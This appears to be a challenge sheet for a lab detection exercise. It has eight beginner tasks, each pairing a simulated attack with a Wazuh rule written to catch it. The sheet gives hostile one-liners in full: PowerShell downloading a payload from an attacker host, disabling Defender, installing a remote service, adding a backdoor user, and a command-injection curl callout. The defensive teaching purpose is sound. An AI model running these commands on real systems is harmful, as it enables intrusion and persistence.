# CHALLENGES — 8 BEGINNER CHALLENGES

Each challenge: run the attack, build one Wazuh rule that catches it, show
the alert. 30–40 minutes each. Pick the OS your team is strongest on — Windows now has five, Linux has four.

Every challenge follows the same pattern:
1. **Run the attack** from your attacker VM.
2. **Watch Wazuh** — the right events arrive already decoded.
3. **Write a rule** that fires on the behaviour. Alert must carry the fields
   named in the card.
4. **Prove it isn't hardcoded** — the final round runs the same attack with
   something changed (different IP, different username, different filename).
   A rule containing a literal IP, username, or filename will fail.

---

## Windows

### W1B — Too many failed logins (easiest)

**Attack:** Brute-force RDP or SMB against the Windows target: 10–12 failed
logins against one account. Don't log in successfully — failures only.

**Build a rule that fires when:** 5+ failed logons (Event 4625) from the same
source IP within 2 minutes. Alert includes source IP and username.

Start from Wazuh's built-in rule 5710 and add a frequency block.

### W2B — PowerShell ran something odd

**Attack:** On the Windows target, run a PowerShell download:
`powershell -c "Invoke-WebRequest -Uri http://<attacker>/payload.txt -OutFile C:\Users\Public\payload.txt"`

**Build a rule that fires when:** PowerShell is launched with a command line
containing a download verb (`Invoke-WebRequest`, `DownloadFile`,
`DownloadString`, `curl`). Alert includes the full command line and the
parent process.

**Watch out:** the final round uses a different download cmdlet or `curl.exe`
instead of `Invoke-WebRequest`. Match the *family*, not one literal string.

### W3B — A new program was installed

**Attack:** Install a new Windows service from the attacker position:
`sc \\target create LabSvc binPath= C:\Users\Public\svc.exe`

**Build a rule that fires when:** a service is installed (Event 7045) with a
binary path **outside** `C:\Windows`. Your first negate condition. Alert
includes service name, path, account.

### W4B — Someone turned off the antivirus

**Attack:** Disable Windows Defender real-time monitoring:
`Set-MpPreference -DisableRealtimeMonitoring $true` — then re-enable it.

**Build a rule that fires when:** Defender real-time protection is disabled
(Event 5001). Bonus: a second rule on the re-enable (Event 5000).

You need to add the Defender operational channel to the agent's log
collection first — that's part of the challenge.

### W5B — File integrity monitoring on Windows

**Attack:** On the Windows target, tamper with a protected file —
copy `rubbish.exe` into the Startup folder, or drop a modified DLL next
to a legitimate application in `C:\Program Files\` (or edit a Run key).

**Build a rule that fires when:** a new file appears in a monitored
location (Startup folder, or any file change under a protected directory)
with the right severity. Windows FIM is built into the Wazuh agent —
`<syscheck>` config — so your job is: configure the monitored directories,
restart the agent, write a rule on the resulting syscheck events.

**Watch out:** the registry is part of file integrity too. Teams that also
monitor `HKLM\...\Run` and alert on new values score full marks.
Pre-existing entries (OneDrive etc.) must NOT fire — the agent baselines
existing files at enrolment.

---

## Linux

### L1B — SSH brute force detection (easiest)

**Attack:** Brute-force SSH on the Linux target: 10–12 failed logins against
one user. Failures only.

**Build a rule that fires when:** 5+ SSH failures from one source IP within
2 minutes. Alert includes source IP and username. Mirror image of W1B —
start from built-in rule 5712.

### L2B — Someone edited the passwd file

**Attack:** Add a backdoor user: `useradd backdoor && passwd backdoor`

**Build a rule that fires when:** `/etc/passwd` or `/etc/shadow` changes.
Configure Wazuh FIM (syscheck) on those two files, then one rule.

**Most likely false positive:** none — file changes to these files are
genuinely rare. This is the cleanest first FIM exercise.

### L3B — A web shell appeared

**Attack:** Upload a PHP file through the DVWA upload function, then request
it once in your browser.

**Build a rule that fires when:** a file lands in the web upload directory
(FIM), or when a `.php`/`.phtml` file under an upload path is requested over
HTTP. Either half scores half; both together is full marks.

### L4B — The web server called home

**Attack:** From the web app's command-injection, make the server connect
out to your attacker machine (`curl http://<attacker>:8000/`).

**Build a rule that fires when:** an outbound connection comes from the
web-server process (`www-data`) to anything non-local. The auditd rule to
feed Wazuh is pre-installed on the target — your job is the Wazuh rule on
top of it.

---

## Recommended pairings

- **Fastest confidence:** W1B + L1B (same skill, two platforms)
- **Detection + defence:** W1B + W4B, or L1B + L2B (one detection, one control)
- **Integrity focus:** W5B + L2B (Windows and Linux file monitoring)
- **Web attack story:** L3B + L4B (the drop, then the callback)

Two or three done properly beats eight rushed. Tell the judges which you
picked and why.
